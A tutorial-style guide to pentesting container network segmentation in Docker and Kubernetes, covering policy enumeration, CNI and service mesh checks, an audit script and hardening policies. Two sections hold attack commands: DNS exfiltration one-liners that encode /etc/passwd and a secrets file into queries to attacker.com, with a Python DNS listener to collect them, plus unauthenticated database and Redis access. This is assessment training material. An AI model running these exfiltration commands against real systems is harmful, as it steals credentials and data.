# Container Network Segmentation Guide

> Comprehensive guide to testing container network segmentation, CNI security, network policies, service mesh security, and network isolation in containerized environments. Learn to identify and exploit network-level misconfigurations in Docker and Kubernetes deployments.

## Introduction

Container networking is a complex layer of abstraction that connects containers, pods, services, and external networks. Unlike traditional network segmentation where physical or VLAN boundaries provide clear isolation, container networks operate through overlay networks, virtual bridges, and software-defined networking (SDN) plugins. Misconfigurations in any of these layers can lead to unauthorized lateral movement, data exfiltration, and privilege escalation across container boundaries.

In Docker, the default bridge network provides no isolation between containers, and custom networks must be explicitly configured with proper policies. In Kubernetes, NetworkPolicies are optional and not enforced by default -- many clusters operate with flat networking where any pod can communicate with any other pod. Service meshes like Istio and Linkerd add mTLS and traffic policies but introduce their own attack surfaces.

This guide covers practical techniques for testing container network segmentation from both inside and outside the container environment, exploiting misconfigurations, and implementing proper network defenses.

### Network Segmentation Taxonomy

| Layer | Component | Common Misconfiguration | Risk |
|-------|-----------|------------------------|------|
| Docker bridge | docker0 (172.17.0.0/16) | No inter-container isolation | Lateral movement |
| Docker custom | User-defined networks | Missing internal flag | External exposure |
| Kubernetes CNI | Calico, Flannel, Cilium, Weave | No NetworkPolicy support | Pod-to-pod access |
| Kubernetes policy | NetworkPolicy resources | No policies or overly permissive | Unrestricted traffic |
| Service mesh | Istio, Linkerd mTLS | Permissive mode or no mesh | Traffic interception |
| Ingress | Ingress controllers | Missing TLS, weak auth | Unauthorized access |
| DNS | CoreDNS, kube-dns | DNS tunneling possible | Data exfiltration |
| Port mapping | Docker -p, kube NodePort | Overly broad port exposure | Service exposure |

## Prerequisites

- Kali Linux with Docker installed
- Kubernetes cluster access (kubectl configured)
- Understanding of TCP/IP networking, DNS, and routing
- Tools: `nmap`, `tcpdump`, `wireshark`, `kubectl`, `docker`, `curl`, `nslookup`

## 1. Docker Network Reconnaissance

### Network Discovery from Inside a Container

```bash
# Identify the Docker network configuration
ip addr show
ip route show
cat /etc/resolv.conf

# Check Docker bridge details
# (from host)
docker network ls
docker network inspect bridge
docker network inspect host

# From inside a container, discover other containers
# Scan the Docker bridge subnet
nmap -sn 172.17.0.0/24 -T4
# Or without nmap:
for i in $(seq 1 254); do
    ping -c1 -W1 172.17.0.$i 2>/dev/null && echo "172.17.0.$i alive"
done

# Identify all Docker networks (from host)
docker network inspect $(docker network ls -q) | \
    jq -r '.[] | "\(.Name): \(.IPAM.Config[0].Subnet // "none")"'

# Check for containers on the same network
docker network inspect bridge | \
    jq -r '.[0].Containers | to_entries[] | "\(.value.Name): \(.value.IPv4Address)"'
```

### Testing Inter-Container Communication (ICC)

```bash
# Docker ICC (Inter-Container Communication) default is ENABLED
# When enabled, containers on the same bridge can communicate freely

# Step 1: Start test containers
docker run -d --name web-server -p 8080:80 nginx:alpine
docker run -d --name app-server alpine sleep 3600

# Step 2: From app-server, test connectivity to web-server
APP_IP=$(docker inspect app-server -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
WEB_IP=$(docker inspect web-server -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

docker exec app-server sh -c "wget -qO- http://$WEB_IP:80"

# Step 3: Test if ICC is disabled (security hardening)
# From host, check Docker daemon settings
cat /etc/docker/daemon.json | grep "icc"
# "icc": false disables container-to-container communication

# Step 4: Disable ICC for testing
# Edit /etc/docker/daemon.json:
cat > /etc/docker/daemon.json << 'EOF'
{
    "icc": false,
    "iptables": true
}
EOF
systemctl restart docker

# Step 5: Verify containers can no longer communicate directly
docker exec app-server sh -c "wget -T2 http://$WEB_IP:80" 2>&1
# Expected: Connection refused/timeout when ICC is disabled
```

### Analyzing Docker iptables Rules

```bash
# Docker manipulates iptables for network isolation
# Inspect the DOCKER-ISOLATION chain
iptables -L DOCKER-ISOLATION-STAGE-1 -n -v
iptables -L DOCKER-ISOLATION-STAGE-2 -n -v

# Check the DOCKER chain for port mappings
iptables -L DOCKER -n -v -t nat

# List all Docker-related rules
iptables -S | grep -i docker

# Verify isolation between custom networks
docker network create --driver bridge isolated_net
docker network create --driver bridge public_net

docker run -d --net isolated_net --name isolated alpine sleep 3600
docker run -d --net public_net --name public alpine sleep 3600

# Test: isolated should NOT reach public
docker exec isolated ping -c2 $(docker inspect public -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
# Expected: failure if properly isolated
```

## 2. Kubernetes Network Policy Testing

### Enumerating Network Policies

```bash
# List all NetworkPolicies in all namespaces
kubectl get networkpolicies -A

# Check if any namespace has no policies (potential flat network)
kubectl get namespaces -o json | \
    jq -r '.items[].metadata.name' | while read ns; do
        count=$(kubectl get networkpolicies -n "$ns" --no-headers 2>/dev/null | wc -l)
        if [ "$count" -eq 0 ]; then
            echo "[WARN] No NetworkPolicies in namespace: $ns"
        fi
    done

# Inspect specific policy details
kubectl get networkpolicy -n production -o yaml

# Check for default deny policies (best practice)
kubectl get networkpolicy -A -o json | \
    jq -r '.items[] | select(.spec.podSelector.matchLabels == {} or .spec.podSelector == {}) |
    "\(.metadata.namespace)/\(.metadata.name)"'

# If no default-deny policies exist, all pod-to-pod traffic is allowed
echo "Checking for default-deny ingress policies..."
if ! kubectl get networkpolicy -A -o json | \
    jq -e '.items[] | select(.spec.podSelector.matchLabels == {} and .spec.policyTypes[] | contains("Ingress"))' > /dev/null 2>&1; then
    echo "[CRITICAL] No default-deny ingress policy found - all inter-pod traffic is allowed"
fi
```

### Testing Pod-to-Pod Connectivity

```bash
# Create a test pod for network reconnaissance
kubectl run net-test --image=nicolaka/netshoot --rm -it --restart=Never -- bash

# From the test pod, enumerate services and endpoints
kubectl get svc -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.spec.clusterIP)"'
kubectl get endpoints -A -o json | jq -r '.items[] | .subsets[].addresses[].ip' | sort -u

# Scan Kubernetes service CIDR for exposed services
nmap -sT -p 80,443,8080,8443,3306,5432,6379,9200,9090,2379,2380,10250 \
    10.96.0.0/12 --open -T4

# Test access to sensitive services
# Kubernetes API
curl -sk https://kubernetes.default.svc:443/api/v1/namespaces

# etcd (should not be reachable from pods)
curl -sk https://10.96.0.1:2379/v2/keys

# Kubelet API (should be restricted)
curl -sk https://NODE_IP:10250/pods

# Database services (should have restrictive policies)
curl -s http://mysql.production.svc:3306
curl -s http://redis.cache.svc:6379 PING
```

### Exploiting Missing Network Policies

```bash
# Scenario: Production namespace has no NetworkPolicies
# Attack: Access sensitive services from an unrelated pod

# Step 1: Deploy a malicious pod in a permissive namespace
cat > malicious-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: network-test
  namespace: default
spec:
  containers:
  - name: netshoot
    image: nicolaka/netshoot
    command: ["sleep", "3600"]
  restartPolicy: Never
EOF
kubectl apply -f malicious-pod.yaml

# Step 2: Exec into the pod
kubectl exec -it network-test -- bash

# Step 3: Scan production database pods
nmap -sT -p 3306,5432,27017 production-pod-ip-range

# Step 4: Connect to production database without authentication
# (if network allows and auth is weak)
mysql -h mysql.production.svc -u root -p'' -e "SHOW DATABASES;"

# Step 5: Access Redis cache
redis-cli -h redis.cache.svc
> KEYS *
> GET sensitive_key
> CONFIG GET requirepass

# Step 6: Exfiltrate data via DNS (if egress is not restricted)
dig $(cat /etc/passwd | base64 | tr -d '\n=' | head -c 60).attacker.com
```

## 3. CNI Plugin Security Assessment

### Calico Network Policy Testing

```bash
# Check Calico installation
kubectl get pods -n kube-system | grep calico

# List Calico GlobalNetworkPolicies
calicoctl get globalnetworkpolicy -o yaml

# List Calico NetworkPolicies (namespaced)
calicoctl get networkpolicy -A -o yaml

# Check Calico BGP peering (potential for route manipulation)
calicoctl get node -o yaml | grep -A5 "bgpPeers"

# Test Calico policy enforcement
# Create a policy that should block traffic
cat > calico-block-test.yaml << 'EOF'
apiVersion: projectcalico.org/v3
kind: NetworkPolicy
metadata:
  name: block-test
  namespace: default
spec:
  selector: app == 'target'
  types:
  - Ingress
  ingress: []
EOF
calicoctl apply -f calico-block-test.yaml

# Verify the policy blocks traffic
kubectl exec network-test -- curl -s --connect-timeout 3 http://target-svc:8080
# Expected: connection refused/timeout if policy is enforced
```

### Cilium Network Security

```bash
# Check Cilium installation
kubectl get pods -n kube-system | grep cilium
cilium status

# List Cilium network policies
kubectl get ciliumnetworkpolicies -A
kubectl get ciliumclusterwidenetworkpolicies -A

# Cilium Hubble for network observability
hubble status
hubble observe --namespace production --follow

# Check Cilium identity-based policies
cilium policy get
cilium endpoint list

# Test Cilium cluster mesh security
cilium clustermesh status
```

### Flannel Security Assessment

```bash
# Flannel does NOT support Kubernetes NetworkPolicies by default
# This is a critical finding if Flannel is the only CNI

# Check Flannel configuration
kubectl get configmap -n kube-system kube-flannel-cfg -o yaml

# Verify that NetworkPolicies are NOT enforced
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: test-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
EOF

# Test if traffic still flows (it will with Flannel alone)
kubectl exec network-test -- curl -s http://target-svc:8080
# If this works, NetworkPolicies are NOT being enforced
```

## 4. Service Mesh Security

### Istio Security Assessment

```bash
# Check Istio installation
istioctl version
istioctl analyze

# Check mTLS mode (STRICT vs PERMISSIVE)
kubectl get peerauthentication -A -o yaml | \
    jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): mtls=\(.spec.mtls.mode // "PERMISSIVE")"'

# Check for PERMISSIVE mode (allows plaintext -- vulnerability)
kubectl get peerauthentication -A -o json | \
    jq -r '.items[] | select(.spec.mtls.mode == "PERMISSIVE" or .spec.mtls.mode == null) |
    "[WARN] Permissive mTLS: \(.metadata.namespace)/\(.metadata.name)"'

# Test if plaintext traffic is accepted
kubectl exec network-test -- curl -s http://target-service:8080
# If response received, mTLS is not enforced

# Check Istio AuthorizationPolicies
kubectl get authorizationpolicies -A -o yaml

# Test for missing authorization (everyone can access everything)
kubectl exec network-test -- curl -s http://api-service.production:443/api/admin
# If this works without auth, authorization policies are missing

# Check for Istio sidecar injection
kubectl get pods -A -o json | \
    jq -r '.items[] | select(.spec.containers | map(.name) | contains(["istio-proxy"]) | not) |
    "[WARN] No Istio sidecar: \(.metadata.namespace)/\(.metadata.name)"'
```

### Linkerd Security Assessment

```bash
# Check Linkerd installation
linkerd check
linkerd viz stat --namespace production

# Verify mTLS between services
linkerd viz edges -n production deployment
linkerd viz tap deployment/target-app -n production --to deployment/database -o json | \
    jq '.event | select(.tls != "true") | "Unencrypted traffic detected"'

# Check for pods without mesh injection
linkerd inject --manual dry-run deployment.yaml | grep "Sidecar injected"
kubectl get pods -A -o json | \
    jq -r '.items[] | select(.spec.containers | map(.name) | contains(["linkerd-proxy"]) | not) |
    "[WARN] No Linkerd proxy: \(.metadata.namespace)/\(.metadata.name)"'
```

## 5. DNS-Based Attacks on Container Networks

### DNS Reconnaissance

```bash
# Kubernetes internal DNS resolution
nslookup kubernetes.default.svc.cluster.local
nslookup <service>.<namespace>.svc.cluster.local

# Enumerate services via DNS
for ns in default kube-system production staging; do
    for svc in $(kubectl get svc -n $ns -o jsonpath='{.items[*].metadata.name}'); do
        nslookup $svc.$ns.svc.cluster.local 2>/dev/null | grep -A1 "Name:" | grep Address && \
            echo "Found: $svc.$ns"
    done
done

# DNS zone transfer attempt (CoreDNS misconfiguration)
dig axfr cluster.local @10.96.0.10
dig axfr svc.cluster.local @10.96.0.10
```

### DNS Data Exfiltration

```bash
# Exfiltrate data via DNS queries
# Step 1: Set up a DNS listener (authoritative DNS for attacker domain)
# On attacker machine:
python3 << 'EOF'
from dnslib import DNSRecord, QTYPE
from dnslib.server import DNSServer, BaseResolver
import logging

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        logging.info(f"Received query: {qname}")
        # Data is embedded in the subdomain
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
        return reply

logging.basicConfig(level=logging.INFO)
resolver = ExfilResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start()
EOF

# Step 2: From the container, exfiltrate via DNS
# Encode data as DNS queries
DATA=$(cat /etc/secrets/config.json | base64 | tr -d '\n=' | fold -w 60)
for chunk in $DATA; do
    dig $chunk.exfil.attacker.com @10.96.0.10 > /dev/null 2>&1
done

# Step 3: Check if egress DNS filtering exists
dig should-be-blocked.attacker.com
# If resolution succeeds, no DNS filtering is in place
```

## 6. Network Isolation Verification

### Automated Network Segmentation Testing

```bash
#!/bin/bash
# Automated container network segmentation test

echo "=== Container Network Segmentation Assessment ==="

# Test 1: Docker ICC check
echo "[1] Docker Inter-Container Communication"
ICC=$(docker info 2>/dev/null | grep "ICC" | awk '{print $NF}')
if [ "$ICC" = "true" ]; then
    echo "[HIGH] ICC is enabled - containers can communicate freely"
else
    echo "[OK] ICC is disabled"
fi

# Test 2: Docker network isolation
echo "[2] Docker Network Isolation"
NETWORKS=$(docker network ls --filter driver=bridge --format '{{.Name}}' | grep -v bridge)
for net in $NETWORKS; do
    INTERNAL=$(docker network inspect $net -f '{{.Internal}}')
    if [ "$INTERNAL" = "false" ]; then
        echo "[INFO] Network $net allows external access"
    fi
done

# Test 3: Exposed ports
echo "[3] Container Port Exposure"
docker ps --format '{{.Names}}: {{.Ports}}' | while read line; do
    if echo "$line" | grep -q "0.0.0.0"; then
        echo "[MEDIUM] Binding to all interfaces: $line"
    fi
done

# Test 4: Kubernetes NetworkPolicies
echo "[4] Kubernetes NetworkPolicy Coverage"
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
    pod_count=$(kubectl get pods -n $ns --no-headers 2>/dev/null | wc -l)
    policy_count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
    if [ "$pod_count" -gt 0 ] && [ "$policy_count" -eq 0 ]; then
        echo "[HIGH] No NetworkPolicies in namespace: $ns ($pod_count pods)"
    fi
done

# Test 5: Service mesh mTLS
echo "[5] Service Mesh mTLS Status"
if command -v istioctl &>/dev/null; then
    istioctl analyze -A 2>/dev/null | grep -i "mtls\|permissive" || echo "[OK] Istio mTLS check"
fi

echo "=== Assessment Complete ==="
```

## Hands-on Exercise: Network Penetration Test

### Scenario: Multi-Tier Kubernetes Application

```bash
# Objective: Test network segmentation between frontend, backend, and database tiers

# Step 1: Identify network topology
kubectl get pods -A -o wide
kubectl get svc -A -o wide
kubectl get networkpolicies -A

# Step 2: Deploy test pod in frontend namespace
kubectl run pentest --image=nicolaka/netshoot -n frontend --rm -it --restart=Never -- bash

# Step 3: Test horizontal segmentation (same tier)
echo "Testing frontend-to-frontend connectivity..."
nmap -sT -p 80,8080,3000 frontend-pod-range

# Step 4: Test vertical segmentation (cross-tier)
echo "Testing frontend-to-backend connectivity..."
nmap -sT -p 8080,8443 backend-service.backend.svc
curl -s http://backend-service.backend.svc:8080/api/internal

# Step 5: Test database access from frontend (should be blocked)
echo "Testing frontend-to-database connectivity..."
nmap -sT -p 3306,5432,27017 database-service.data.svc
mysql -h database-service.data.svc -u root -e "SELECT 1"

# Step 6: Test egress controls
echo "Testing egress connectivity..."
curl -s http://ifconfig.me  # External IP check
dig google.com              # DNS egress
nmap -sT -p 443 external-target.com  # HTTPS egress

# Step 7: Document all findings
echo "=== Findings ==="
echo "Horizontal segmentation: [PASS/FAIL]"
echo "Vertical segmentation: [PASS/FAIL]"
echo "Egress controls: [PASS/FAIL]"
echo "DNS filtering: [PASS/FAIL]"
```

## Defense Perspective

### Implementing Network Segmentation

```bash
# 1. Default deny all traffic in every namespace
cat > default-deny.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF
kubectl apply -f default-deny.yaml

# 2. Allow only specific traffic patterns
cat > allow-frontend-to-backend.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: backend
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          env: frontend
    ports:
    - protocol: TCP
      port: 8080
EOF
kubectl apply -f allow-frontend-to-backend.yaml

# 3. Docker network hardening
# Create internal-only network (no external access)
docker network create --internal --driver bridge secure_net

# 4. Restrict DNS egress
cat > restrict-dns-egress.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-dns-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
EOF
kubectl apply -f restrict-dns-egress.yaml

# 5. Enable Istio STRICT mTLS
cat > strict-mtls.yaml << 'EOF'
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT
EOF
kubectl apply -f strict-mtls.yaml
```

## References

- **Kubernetes NetworkPolicies**: https://kubernetes.io/docs/concepts/services-networking/network-policies/
- **Calico Network Security**: https://docs.tigera.io/calico/latest/network-policy/
- **Cilium Network Policy**: https://docs.cilium.io/en/stable/policy/
- **Istio Security**: https://istio.io/latest/docs/concepts/security/
- **Docker Network Security**: https://docs.docker.com/engine/security/
- **CIS Kubernetes Benchmark**: https://www.cisecurity.org/benchmark/kubernetes
- **NSA Kubernetes Hardening Guide**: https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE.PDF
- **NIST SP 800-190 Container Security**: https://csrc.nist.gov/publications/detail/sp/800-190/final
- **Kubernetes Network Security Deep Dive**: https://kubernetes.io/blog/2024/network-policies-available/
